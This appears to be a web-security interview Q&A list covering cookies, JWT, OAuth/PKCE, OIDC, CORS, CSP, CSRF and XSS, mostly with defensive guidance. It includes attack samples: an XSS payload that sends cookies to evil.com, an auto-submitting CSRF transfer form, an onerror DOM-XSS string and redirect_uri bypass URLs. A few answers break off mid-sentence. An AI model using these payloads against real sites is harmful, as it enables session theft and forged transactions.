<details>
<summary>224. What does each cookie security attribute (`Secure`, `HttpOnly`, `SameSite`) protect against, and how do they work?</summary>

Each attribute targets a specific attack vector.

`Secure` prevents Man-in-the-Middle (MitM) attacks. The cookie is only sent over HTTPS connections (except localhost), so it can't be intercepted over plain HTTP.

`HttpOnly` prevents Cross-Site Scripting (XSS) attacks. JavaScript running in the browser has no access to the cookie via `document.cookie`, so a malicious injected script can't steal the session token.

`SameSite` prevents Cross-Site Request Forgery (CSRF) attacks. It controls whether the cookie is sent on cross-origin requests. `Strict` sends it only for same-site requests. `Lax` (the default) sends it when a user navigates to your site from an external link, but not on background cross-origin requests. `None` sends it everywhere, but requires `Secure` to also be set.

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```

This cookie cannot be read by JavaScript, won't travel over HTTP, and won't be attached to cross-site requests — covering all three attack vectors at once.

Gotcha: `SameSite=None` without `Secure` is invalid — browsers will reject or ignore it. If you need cross-origin cookies (e.g. for embedded third-party widgets), you must also serve over HTTPS.

</details><br>

<details>
<summary>225. What are the three parts of a JWT and what role does each play?</summary>

A JWT is a dot-separated string with three Base64URL-encoded segments: `header.payload.signature`.

The header declares the token type and signing algorithm:

```json
{ "alg": "HS256", "typ": "JWT" }
```

The payload carries the claims — assertions about the user or session:

```json
{ "sub": "1234567890", "name": "Jane", "admin": true }
```

The signature proves the token hasn't been tampered with. It is computed over the encoded header and payload using a secret or private key:

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

A server verifies a JWT by recomputing the signature and comparing it. If the payload was altered, the signature won't match and the token is rejected.

Gotcha: the payload is Base64URL-encoded, not encrypted — anyone can decode and read it. Never store sensitive data (passwords, PII) in a JWT unless the token is also encrypted (JWE). Use JWTs to verify identity and claims, not to hide data.

</details><br>

<details>
<summary>226. What are the four roles in the OAuth 2.0 framework?</summary>

OAuth 2.0 defines four distinct roles that participate in any authorization flow.

**The resource owner** is the user who owns the data and grants access to it.

**The client** is the third-party application requesting access on the user's behalf.

**The resource server** is the API that hosts the protected resources.

**The authorization server** is the server that authenticates the user, collects their consent, and issues tokens — in smaller deployments this may be the same server as the resource server, but large-scale systems typically run it separately.

```
Resource Owner (user)
       │ grants consent
       ▼
Authorization Server ──issues token──► Client (app)
                                              │ uses token
                                              ▼
                                       Resource Server (API)
```

Gotcha: the client and resource server are always separate. The only components that are sometimes combined are the authorization server and resource server.

</details><br>

<details>
<summary>227. What is a client ID and client secret in OAuth 2.0, and how do their confidentiality requirements differ?</summary>

When you register an application with an OAuth provider, you receive a client ID and optionally a client secret.

**The client ID** is a public identifier for your application — it is always included in authorization requests and is not sensitive.

**The client secret** is a confidential credential used to authenticate your application to the token endpoint. It must never be exposed in client-side code, browser environments, or mobile apps because any user can inspect those environments and extract it.

```
# Server-side token exchange (secret is safe here)
POST /token
  grant_type=authorization_code
  code=AUTH_CODE
  client_id=CLIENT_ID
  client_secret=CLIENT_SECRET   # only in confidential clients

# Public client (SPA, mobile) — no secret; use PKCE instead
POST /token
  grant_type=authorization_code
  code=AUTH_CODE
  client_id=CLIENT_ID
  code_verifier=CODE_VERIFIER
```

Gotcha: a "confidential client" (server-side app) can hold a secret securely; a "public client" (SPA, mobile app) cannot. Sending a secret from a public client does not add security — it just exposes the secret.

</details><br>

<details>
<summary>228. What OAuth 2.0 grant types exist, and when is each appropriate?</summary>

OAuth 2.0 defines several grant types, each suited to a different deployment scenario.

- **Authorization Code** is the standard grant for all user-facing applications: web server apps, SPAs, and mobile apps. Web server apps use it with a client secret; SPAs and mobile apps use it with PKCE instead of a secret.

- **Client Credentials** is used for machine-to-machine access where no user is involved — background services, daemons, and server-to-server calls.

- **Password (Resource Owner Password Credentials)** allows the client to collect the user's username and password directly and exchange them for a token. It is only appropriate for first-party applications (i.e. the client and the authorization server are owned by the same organization) and even then is strongly discouraged; the Authorization Code flow is preferred.

- **Implicit** was historically recommended for public clients (SPAs, mobile) because those clients cannot keep a secret. It is deprecated as of OAuth 2.0 Security Best Current Practice. The replacement is _Authorization Code + PKCE_, which provides equivalent functionality without the security weaknesses of Implicit.

```
User-facing web server app   → Authorization Code + client secret
SPA or mobile app            → Authorization Code + PKCE
Machine-to-machine (no user) → Client Credentials
```

</details><br>

<details>
<summary>229. How does the Authorization Code flow work for server-side web applications?</summary>

The Authorization Code flow for confidential (server-side) clients has three phases.

Phase 1 — redirect the user to the authorization server:

```
GET https://auth-server.com/auth
  ?response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=REDIRECT_URI
  &scope=photos
  &state=RANDOM_STRING
```

The `state` parameter is a random, unguessable value your server generates and stores (e.g. in a session or signed cookie). Its purpose is CSRF protection — you must verify it matches when the user returns.

Phase 2 — receive the authorization code:

```
GET https://your-app.com/callback
  ?code=AUTH_CODE
  &state=RANDOM_STRING    ← must match what you sent
```

Verify `state` before proceeding. The code is short-lived (typically 60–600 seconds) and single-use.

Phase 3 — exchange the code for an access token (server-side POST):

```
POST https://auth-server.com/token
  grant_type=authorization_code
  code=AUTH_CODE
  redirect_uri=REDIRECT_URI     ← must be identical to phase 1
  client_id=CLIENT_ID
  client_secret=CLIENT_SECRET   ← safe because this is server-side
```

Response:

```json
{ "access_token": "TOKEN", "expires_in": 3600 }
```

Gotcha: the `redirect_uri` in the token request must be byte-for-byte identical to the one sent in the authorization request. A mismatch causes the server to reject the exchange.

</details><br>

<details>
<summary>230. What is PKCE, and how does it protect the Authorization Code flow for public clients?</summary>

PKCE (Proof Key for Code Exchange, RFC 7636, 2015) is an extension to the Authorization Code flow that protects public clients — SPAs and mobile apps — that cannot hold a client secret.

- The core idea: before starting the flow, the client generates a random secret called the `code verifier` (43–128 characters).

- It hashes this value with `SHA-256` and `URL-safe base64-encodes` the result to produce the code challenge.

- The challenge is sent to the authorization server at the start of the flow; the plain verifier is sent at the token exchange step.

- The server hashes the verifier and checks it matches the earlier challenge before issuing a token.

```
# Step 1 — generate secrets
code_verifier  = random 43–128 char string
code_challenge = base64url(sha256(code_verifier))

# Step 2 — authorization request includes the challenge
GET /auth
  ?response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=REDIRECT_URI
  &state=RANDOM_STATE
  &code_challenge=CODE_CHALLENGE
  &code_challenge_method=S256

# Step 3 — token request includes the verifier (no secret)
POST /token
  grant_type=authorization_code
  code=AUTH_CODE
  redirect_uri=REDIRECT_URI
  client_id=CLIENT_ID
  code_verifier=CODE_VERIFIER
```

The protection: even if an attacker intercepts the authorization code (e.g. via a malicious redirect handler on a mobile device), they cannot exchange it for a token without the code verifier, which was never transmitted over the network in the first place.

Gotcha: `code_challenge_method=S256` is mandatory. The plain method (sending the verifier as the challenge without hashing) is insecure and should not be used.

</details><br>

<details>
<summary>231. What is the Password grant type (Resource Owner Password Credentials), and why is it discouraged?</summary>

The Password grant (also called Resource Owner Password Credentials, or ROPC) allows the client to collect the user's username and password directly and send them to the token endpoint in exchange for an access token.

```
POST /token
  grant_type=password
  username=USERNAME
  password=PASSWORD
  client_id=CLIENT_ID
```

It was originally permitted only for first-party applications where the client and authorization server are operated by the same organization, on the grounds that the user already trusts the application with their credentials.

It is strongly discouraged in current OAuth security guidance for several reasons:

- It requires the client to handle raw user credentials, eliminating the security benefit of delegated authorization.
- It cannot support multi-factor authentication, federated identity, or any consent UI.
- It trains users to enter their credentials into clients directly, which makes phishing easier.

The preferred replacement for all user-facing scenarios is Authorization Code with PKCE, which keeps credentials entirely within the authorization server and supports MFA and modern login experiences.

</details><br>

<details>
<summary>232. How does the Client Credentials grant work, and when is it appropriate?</summary>

The Client Credentials grant is used for machine-to-machine access — situations where no user is present and the application itself needs to authenticate.

```
POST /token
  grant_type=client_credentials
  client_id=CLIENT_ID
  client_secret=CLIENT_SECRET

# Response
{ "access_token": "TOKEN", "expires_in": 3600 }
```

Appropriate use cases include backend services calling other internal APIs, cron jobs or daemons, and server-to-server integrations where the action is performed on behalf of the application itself rather than a specific user.

Gotcha: there is no user context in a Client Credentials token. The resource server cannot use it to identify which user initiated an action. If per-user authorization matters, use Authorization Code instead. Also, the client secret must be stored securely in the server environment — never in mobile apps, browsers, or source control.

</details><br>

<details>
<summary>233. How do you use an OAuth 2.0 access token to make an authenticated API request?</summary>

Regardless of which grant type was used to obtain it, an access token is sent in the `Authorization` header of HTTP requests using the Bearer scheme, as defined in RFC 6750.

```
GET /api/me HTTP/1.1
Host: api.example.com
Authorization: Bearer ACCESS_TOKEN_HERE
```

Using curl:

```bash
curl -H "Authorization: Bearer ACCESS_TOKEN_HERE" \
  https://api.example.com/v1/me
```

The token must not be placed in the URL as a query parameter in production — query strings appear in server logs, browser history, and Referer headers, which can expose the token to unintended recipients.

Gotcha: access tokens expire (the `expires_in` value in the token response is in seconds). If your application needs long-lived access, request a refresh token at authorization time and use it to obtain new access tokens without requiring the user to re-authorize.

</details><br>

<details>
<summary>234. What are the redirect_uri validation requirements for OAuth 2.0 providers?</summary>

OAuth service providers must require client applications to pre-register a whitelist of valid redirect URIs and validate the redirect_uri in every authorization request by exact, byte-for-byte string comparison.

```
# Registered: https://client.example.com/callback

# Allowed:
redirect_uri=https://client.example.com/callback

# Must be rejected (pattern-match bypass attempts):
redirect_uri=https://client.example.com/callback/../evil
redirect_uri=https://client.example.com.attacker.com/callback
redirect_uri=https://client.example.com/callback?extra=param
```

Pattern matching (prefix matching, regex, domain-only matching) introduces bypass vectors. If an attacker can redirect the authorization code to a URI they control, they can exchange it for an access token. The redirect_uri should also be sent to the /token endpoint and re-validated there, not only at /authorize, to prevent code injection attacks.

</details><br>

<details>
<summary>235. What is scope validation in OAuth 2.0 and what happens when it is missing?</summary>

Scope defines the specific permissions granted by an access token (e.g. read:email, write:contacts). The resource server must verify on every request that the scope of the presented token actually covers the operation being performed, and the authorization server must ensure tokens are never issued with broader scope than the client requested.

```
# Token issued with scope: read:email

POST /contacts          ← should be rejected (scope mismatch)
Authorization: Bearer <token_with_read:email_scope>
```

Without scope validation, a token issued for low-privilege access can be reused to call high-privilege endpoints — effectively granting privilege escalation. The authorization server should also validate that the client is registered to request the scopes it asks for, not only that the user consented.

</details><br>

<details>
<summary>236. What is OpenID Connect and how does it differ from bare OAuth 2.0?</summary>

OpenID Connect (OIDC) is an identity layer built on top of OAuth 2.0. Where OAuth 2.0 only authorizes access to resources, OIDC defines how a client can reliably verify the identity of the user who authenticated and obtain basic profile information. It does this by introducing the id_token — a signed JWT returned alongside the access token.

```
# id_token payload (decoded)

{
  "iss": "https://www.facebook.com",
  "sub": "1234567890",
  "aud": "your_app_client_id", ← must match your client_id
  "exp": 1743534000,
  "iat": 1743530400,
  "nonce": "a8f3k2p9q1",       ← prevents replay, random-per-request
  "name": "John Doe",
  "given_name": "John",
  "family_name": "Doe",
  "email": "john.doe@example.com",
  "picture": "https://profile.facebook.com/photo/1234567890.jpg"
}
```

The client must validate: the signature (against the provider's JWKS), iss (expected issuer), aud (your client_id), exp (not expired), and nonce (matches what was sent in the request). Skipping audience validation allows tokens issued to other clients to be replayed against yours. OIDC also standardizes the /userinfo endpoint format and a discovery document (/.well-known/openid-configuration).

</details><br>

<details>
<summary>237. How can authorization codes leak via browser mechanisms?</summary>

Authorization codes appear in the callback URL as a query parameter after the user approves the OAuth flow. If anything causes the browser to make an outbound request from that URL before the code is consumed, the full URL — including the code — leaks via the Referer header to third-party servers.

```
# Callback URL containing the code
https://client.example.com/callback?code=AUTH_CODE_HERE

# Any external resource loaded by that page leaks the code:
<img src="https://analytics.third-party.com/pixel.gif">
# → Referer: https://client.example.com/callback?code=AUTH_CODE_HERE
```

Additional leak vectors: dynamically generated JavaScript files that embed the code (callable via `<script src>` from external domains); server-side logs; browser history.

**The safest architecture is a backend callback endpoint.** The browser hits `myapp.com/callback?code=SECRET`, the server immediately exchanges the code for a token, sets a session cookie, and responds with a 302 redirect to the actual UI page. The user never sees or lingers on the callback URL, and no frontend resources are ever loaded with the code in the URL.

```
# Ideal server-side callback flow
GET /callback?code=SECRET  →  server exchanges code for token
                           →  server sets session cookie
                           →  302 redirect to /dashboard
# Code is gone before any page renders
```

**For SPAs with no backend**, a true backend callback is often not possible. In this case: use PKCE

</details><br>

<details>
<summary>238. What four origin differences cause a browser to treat a request as cross-origin and trigger CORS checks?</summary>

A request is cross-origin — and therefore subject to CORS — whenever the scheme, host, or port of the request target differs from the page's origin. The four concrete triggers are:

- Different domain: example.com → api.com
- Different subdomain: example.com → api.example.com
- Different port: example.com → example.com:3001
- Different scheme/protocol: https://example.com → http://example.com

```
// All four trigger CORS when called from https://example.com
fetch("https://api.com/data");            // different domain
fetch("https://api.example.com/data");    // different subdomain
fetch("https://example.com:3001/data");   // different port
fetch("http://example.com/data");         // different scheme
```

Gotcha: scheme comparison is case-sensitive per the URL spec, and http vs https is always a different origin regardless of the host being identical.

</details><br>

<details>
<summary>239. What are CORS simple requests, and what conditions must a request satisfy to qualify as one?</summary>

A "simple" cross-origin request is one the browser sends directly without a preflight OPTIONS check. To qualify, the request must satisfy all of the following:

Method must be one of: GET, HEAD, POST.

Headers must be limited to the CORS-safelisted set:

- Accept
- Accept-Language
- Content-Language
- Content-Type — but only with one of these values: application/x-www-form-urlencoded, multipart/form-data, text/plain

No event listeners may be registered on the XMLHttpRequest.upload object, and no ReadableStream may be used in the request.

```
// Simple request — no preflight triggered
fetch("https://api.example.com/data", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: "key=value"
});

// NOT simple — triggers preflight (custom header)
fetch("https://api.example.com/data", {
  method: "POST",
  headers: { "Content-Type": "application/json" }  // not in safelist
});
```

Gotcha: application/json is not a safelisted Content-Type value, so a POST with a JSON body always triggers a preflight — a very common source of confusion.

</details><br>

<details>
<summary>240. What is a CORS preflight request and how does it work?</summary>

A preflight is an automatic HTTP OPTIONS request the browser sends before a non-simple cross-origin request. Its purpose is to ask the server whether the actual request (with its specific method and headers) is permitted.

The browser attaches two headers to the preflight:

- Access-Control-Request-Method: the method of the actual request
- Access-Control-Request-Headers: any non-safelisted headers the actual request will include

The server must respond with matching Access-Control-Allow-\* headers. If it does, the browser proceeds with the actual request. If not, the browser blocks it and never sends the actual request.

```
// Browser sends automatically before a PUT with JSON:
OPTIONS /resource HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, X-Auth-Token

// Server must respond with:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type, X-Auth-Token
```

Gotcha: The preflight response itself carries no payload. A 200 body is wasted; 204 is the conventional status. The actual request is sent only after a valid preflight response.

</details><br>

<details>
<summary>241. What CORS response headers does a server use to control cross-origin access?</summary>

The six server-side CORS response headers and their roles:

Access-Control-Allow-Origin — the origin(s) permitted to read the response. Either a specific origin or \* for any origin.

Access-Control-Allow-Methods — in preflight responses, the HTTP methods the server allows.

Access-Control-Allow-Headers — in preflight responses, the request headers the server allows. Required for any non-safelisted header (e.g., Authorization, X-Auth-Token).

Access-Control-Expose-Headers — the response headers a browser script is permitted to read. By default, only the CORS-safelisted response headers (Cache-Control, Content-Language, Content-Length, Content-Type, Expires, Last-Modified, Pragma) are accessible; all others must be explicitly listed here.

Access-Control-Allow-Credentials — must be the string "true" to allow cookies, HTTP authentication, or TLS client certificates to be included. When present, Access-Control-Allow-Origin must not be \*.

Access-Control-Max-Age — how long (in seconds) a preflight response may be cached.

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Expose-Headers: X-Request-Id
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
```

Gotcha: Pairing Access-Control-Allow-Credentials: true with Access-Control-Allow-Origin: \* is explicitly forbidden by the spec and browsers will block such responses. Always specify an exact origin when credentials are involved.

</details><br>

<details>
<summary>242. What is the Origin request header and can a script modify it?</summary>

The Origin header is automatically added by the browser to cross-origin requests (and to same-origin POST requests). It contains only the scheme, host, and port of the page making the request — no path, no query string.

```
Origin: https://app.example.com
```

Scripts cannot read or set the Origin header. Browsers classify it as a forbidden header name. Any attempt to set it via fetch() or XMLHttpRequest headers is silently ignored.

This makes Origin trustworthy as a server-side check for same-site request validation, though it should be used alongside CSRF tokens rather than as the sole protection — the header is absent on some navigational requests and may be null in privacy-sensitive contexts (sandboxed iframes, data: URLs).

Gotcha: Origin can be the string "null" (not absent — the literal text "null") when a request comes from a sandboxed iframe, a redirect chain that crossed origins, or a local file. Servers should not whitelist "null" as an allowed origin.

</details><br>

<details>
<summary>243. How does Access-Control-Allow-Credentials interact with cookies and Access-Control-Allow-Origin: * ?</summary>

By default, cross-origin requests do not include cookies, HTTP authentication headers, or TLS client certificates. To include credentials, two things must both be true:

1. The client must opt in: fetch is called with credentials: "include" (or withCredentials: true on XMLHttpRequest).
2. The server must opt in: the response must contain Access-Control-Allow-Credentials: true.

If either side omits its opt-in, the browser will not expose the response to the script (for credentialed requests) or will not send credentials at all.

```
// Client
fetch("https://api.example.com/profile", {
  credentials: "include"
});

// Server must respond with BOTH:
Access-Control-Allow-Origin: https://app.example.com  // exact origin — NOT *
Access-Control-Allow-Credentials: true
```

Gotcha: The spec explicitly forbids Access-Control-Allow-Origin: \* together with Access-Control-Allow-Credentials: true. Browsers reject such responses. Using a wildcard origin with credentials is a security violation because it would allow any site to make authenticated requests on behalf of a user.

</details><br>

<details>
<summary>244. What is the Content-Security-Policy (CSP) header and what is its primary purpose?</summary>

The Content-Security-Policy (CSP) HTTP response header lets a server declare which origins and resource types the browser is allowed to load for a given page. It is enforced by the browser, not the server — the server only communicates the policy; the browser decides whether to permit or block each resource load.

Its primary goals are:

1. Mitigating cross-site scripting (XSS): By whitelisting trusted script sources, CSP prevents injected scripts from unknown origins from executing, even if an attacker manages to inject markup into the page.
2. Mitigating packet sniffing / protocol downgrade attacks: CSP can restrict resources to HTTPS only, complementing HSTS and secure cookie flags.

Basic structure — directives are semicolon-separated, and each directive names a resource type followed by one or more allowed sources:

```
Content-Security-Policy: default-src 'self';
                         img-src *;
                         media-src media1.com media2.com;
                         script-src userscripts.example.com
```

`default-src` is the fallback for any fetch directive that is not explicitly set. Source values can be scheme-only (`https:`), origin-specific (`https://cdn.example.com`), the keyword `'self'` (same origin as the document), or `*` (any origin, use sparingly).

Gotcha: CSP does not protect against server-side injection or SQL injection — it only controls what the browser loads and executes after the page is delivered.

</details><br>

<details>
<summary>245. How does CSP help prevent packet sniffing and protocol downgrade attacks, and what complementary headers should accompany it?</summary>

CSP can enforce that all resources are loaded over HTTPS by using a scheme-only source in `default-src`:

```
Content-Security-Policy: default-src https:; script-src https: 'self';
```

This causes the browser to block any mixed-content load (e.g., an `http://` image or script) even if the page itself was served over HTTPS.

However, CSP alone does not prevent a user from initially navigating to the site over HTTP. A complete protocol-security strategy requires three additional mechanisms working together:

1. Strict-Transport-Security (HSTS) — tells the browser to always use HTTPS for the domain for a specified duration, even if the user types a plain `http://` URL.

```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

2. Secure cookie attribute — prevents session cookies from being sent over plain HTTP connections.

```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```

3. HTTP-to-HTTPS redirects — ensures any plain HTTP request is redirected at the server level before sensitive data is exchanged.

Gotcha: HSTS only takes effect after the browser has made at least one successful HTTPS request and received the header. For first-time visitors, only server-level redirects and HSTS preloading provide protection from the very first connection.

</details><br>

<details>
<summary>246. What is a Cross-Site Request Forgery (CSRF) attack and what three conditions must be present for it to succeed?</summary>

CSRF is an attack that tricks an authenticated user's browser into sending an unintended state-changing request to a web application the user is already logged into. Because the browser automatically attaches session credentials (cookies, Basic auth headers) to every request to the target origin, the server cannot distinguish the attacker-induced request from a legitimate one.

Classic example: a malicious page on `evil.com` contains a hidden form that auto-submits to bank.com/transfer. If the user is logged into bank.com, the browser sends the session cookie with the forged request, and the transfer executes.

Three conditions that must all be present for CSRF to be exploitable:

1. **A relevant action exists** — the attacker must have a reason to trigger it (e.g., change email address, transfer funds, escalate privileges).

2. **Cookie-based (or HTTP Basic) session handling** — the application relies solely on automatically-attached credentials to identify the user. No secondary mechanism (e.g., a request-body token) is checked.

3. **Predictable request parameters** — the attacker must be able to construct the entire request in advance. If the action requires knowledge of a secret value the attacker cannot guess (such as the user's current password), the attack is blocked.

```
<!-- Attacker's page — auto-submitting hidden form -->
<form action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to"     value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

Gotcha: CSRF does not let the attacker read the response — it can only trigger writes. This means confidential data cannot be exfiltrated via CSRF alone, but accounts can be taken over, credentials changed, or destructive actions performed.

</details><br>

<details>
<summary>247. What are the primary defenses against CSRF, and in what order of robustness should they be applied?</summary>

OWASP and MDN recommend implementing at least one primary defense and treating SameSite cookies as a complementary layer, not a standalone solution.

Primary defenses (pick at least one):

1. Synchronizer (CSRF) token — the server embeds a per-session, cryptographically random token in every state-changing form or endpoint. The server validates the token on every incoming request before executing the action. The token is never included automatically by the browser, so a cross-origin forged request cannot supply a valid one.

```
<!-- Server renders this into the form -->
<input type="hidden" name="csrf_token" value="xK9mQ2...randomvalue...">

# Server-side validation (pseudocode)
if request.POST['csrf_token'] != session['csrf_token']:
    abort(403)
```

2. Fetch metadata headers (Sec-Fetch-Site, Sec-Fetch-Mode) — modern browsers attach these request headers automatically. The server rejects any state-changing request where Sec-Fetch-Site is cross-site.

```
# Reject cross-site state-changing requests
if request.headers.get('Sec-Fetch-Site') not in ('same-origin', 'same-site', None):
    abort(403)
```

3. Non-simple requests for JS-initiated calls — if the API is called via fetch() or XMLHttpRequest and you require a custom header (e.g., X-Requested-With: XMLHttpRequest), the browser's CORS preflight mechanism blocks cross-origin requests from setting that header.

Defense-in-depth layer (not a standalone replacement):

SameSite cookie attribute — set session cookies to SameSite=Strict or SameSite=Lax. This reduces the CSRF attack surface significantly but has known bypass routes, so OWASP explicitly states it must not replace a CSRF token.

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

</details><br>

<details>
<summary>248. How does the Sec-Fetch-Site header work, and why can't an attacker forge it?</summary>

`Sec-Fetch-Site` is a browser-controlled request header that describes the relationship between the origin that initiated a request and the origin receiving it. It's shipped in all major browsers by 2021.

The browser sets it automatically on every request and JavaScript cannot read, set, or override it — any attempt to do so via fetch() or XMLHttpRequest is silently ignored.

The four possible values:

`same-origin` — the request was initiated by a page at the exact same origin (scheme + host + port) as the destination. Example: a fetch() call on https://bank.com/dashboard sending a request to https://bank.com/transfer.

`same-site` — the request came from a different subdomain of the same eTLD+1. Example: https://app.example.com requesting https://api.example.com. Same site, different origin.

`cross-site` — the request came from a completely different site. This is the value set when evil.com triggers a request to bank.com — the CSRF scenario.

`none` — the request is a direct navigation: the user typed a URL, clicked a bookmark, or opened a link from a non-web context like an email client.

Using it server-side to block CSRF:

```typescript
const SAFE_METHODS = new Set(["GET", "HEAD", "OPTIONS"]);

function csrfCheck(request: Request): void {
  if (SAFE_METHODS.has(request.method)) return;

  const fetchSite = request.headers.get("Sec-Fetch-Site");

  if (!["same-origin", "same-site", "none", null].includes(fetchSite)) {
    throw new Response("Forbidden", { status: 403 });
  }
}
```

Older browsers do not send Fetch Metadata headers at all, so the header will be absent and the check falls through to the permissive path.

Because of these gaps, OWASP recommends using Fetch Metadata checks alongside a CSRF token, not instead of one.

</details><br>

<details>
<summary>249. What is the SameSite cookie attribute, what are its three values, and what are its limitations as a CSRF defense?</summary>

`SameSite` is a cookie attribute that instructs the browser whether to include the cookie in cross-site requests. It was introduced to reduce CSRF exposure without requiring application-level token logic.

The three values:

`Strict` — the cookie is never sent on any cross-site request, including top-level navigations triggered by clicking a link on another site. Highest security, but users who follow an external link to the site will appear logged out until they navigate within the site.

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

`Lax` — the cookie is sent on cross-site top-level GET navigations (user clicks a link) but withheld on cross-site POST, iframe loads, image loads, and other sub-resource requests. Blocks the most common CSRF vectors while preserving usability. As of Chrome 80 (February 2020), Lax is the default when SameSite is not specified in Chrome, Edge, and Opera; Firefox and Safari have not adopted this default universally as of December 2024.

```
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```

`None` — the cookie is sent on all requests, cross-site included. Requires the Secure flag to be set alongside it. Provides no CSRF protection.

```
Set-Cookie: thirdparty=xyz; SameSite=None; Secure
```

Gotcha: Never set a SameSite cookie on the root domain (e.g., Domain=example.com) — this shares it with all subdomains, including those not under your control via CNAME.

</details><br>

<details>
<summary>250. What is Cross-Site Scripting (XSS), what are its three variants, and how does it differ from CSRF?</summary>

XSS is an injection attack in which an attacker causes a victim's browser to execute malicious JavaScript in the security context of a trusted website. Unlike CSRF — which forces the browser to issue an unintended request using the victim's credentials — XSS gives the attacker full JavaScript execution inside the target origin, which is a far more powerful primitive: the attacker can read data, exfiltrate cookies and tokens, modify the DOM, make authenticated API calls, and completely bypass SameSite cookie protections (because the script runs same-site).

The three variants:

Stored XSS (persistent) — the malicious payload is saved on the server (database, comment, profile field) and served to every user who loads that data. Impact is broad: every visitor of the affected page is attacked.

```
<!-- Attacker submits this as a comment -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
<!-- Server stores it; browser of every later visitor executes it -->
```

Reflected XSS — the payload is embedded in a URL parameter or form input, echoed immediately in the server's response, and executed when the victim clicks the crafted link. It is not stored on the server; each victim requires a separate social-engineering step.

```
https://example.com/search?q=<script>/*malicious*/</script>
```

DOM-based XSS — the vulnerability exists entirely in client-side JavaScript. The script reads attacker-controlled data (URL hash, query string, postMessage) and writes it to the DOM without sanitization, bypassing the server entirely. The server response itself may be safe; the d
Key difference from CSRF: CSRF exploits the server's trust in the browser; XSS exploits the browser's trust in the page. A CSRF token stops CSRF but not XSS — once an attacker has JS execution, they can read the CSRF token from the DOM and include it in forged requests anyway.

</details><br>

<details>
<summary>251. What are the primary mitigations for XSS, and what does each protect against?</summary>

Defending against XSS requires multiple layers because no single control is complete.

1. Input validation — reject or sanitize data at ingestion time. Enforce expected types, lengths, and character sets. This reduces the attack surface but cannot be the sole defense, because developers cannot predict every output context at input time.

2. Output encoding — the most critical control. Encode all user-supplied data before rendering it into the page, using the correct encoding function for the output context (HTML entity encoding, JavaScript string escaping, URL encoding, CSS escaping). A library like DOMPurify or a templating engine with auto-escaping handles this systematically.

```javascript
// WRONG — raw DOM write, vulnerable to DOM XSS
element.innerHTML = userInput;

// RIGHT — text only, no HTML parsing
element.textContent = userInput;

// RIGHT — use a sanitizer when HTML is genuinely needed
element.innerHTML = DOMPurify.sanitize(userInput);
```

3. Content Security Policy (CSP) — a strict CSP limits which scripts can execute and blocks inline scripts, reducing the damage if injection does occur. It is not a primary prevention control — it is a mitigation for when prevention fails.

4. HttpOnly cookies — marking session cookies HttpOnly prevents JavaScript from reading them via document.cookie, so cookie sending is blocked even if XSS occurs. It does not prevent the attacker from making authenticated requests using the victim's session.

</details><br>

<details>
<summary>252. What is DOM-based XSS, how does it differ from stored and reflected XSS?</summary>

In stored and reflected XSS, the malicious payload travels through the server — it either gets saved to a database or echoed back in an HTTP response. The browser receives dangerous HTML from the server and executes it.

DOM-based XSS is structurally different: the server response is completely clean. The attack never touches the server. The vulnerability is entirely in what the page's own JavaScript does after it loads — it reads attacker-controlled data from the browser environment and writes it into the DOM without sanitization.

The classic example:

```javascript
// Vulnerable client-side code
document.getElementById("output").innerHTML = location.hash.slice(1);
```

Sequence of events when a victim visits `https://example.com/page#<img src=x onerror=alert(1)>`:

1. The browser sends a request for `/page` — the `#fragment` is stripped by the browser and never reaches the server.
2. The server returns a normal, clean HTML page. No WAF trigger, no suspicious log entry.
3. The page's own JavaScript reads `location.hash` and writes it into `innerHTML`.
4. The browser parses the string as HTML, renders the `<img>` tag, the `src=x` load fails, and `onerror` executes arbitrary JavaScript.

Why `innerHTML` is dangerous and what to use instead:

`innerHTML` instructs the browser to parse the string as HTML — any tags, attributes, and event handlers inside it become live DOM nodes. `textContent` treats the string as literal text and renders nothing.

```javascript
const userInput = "<img src=x onerror=alert(1)>";

// DANGEROUS — browser parses and executes the string as HTML
document.getElementById("output").innerHTML = userInput;

// SAFE — browser displays the literal characters, parses nothing
document.getElementById("output").textContent = userInput;

// SAFE when HTML output is genuinely required
document.getElementById("output").innerHTML = DOMPurify.sanitize(userInput);
```

</details><br>
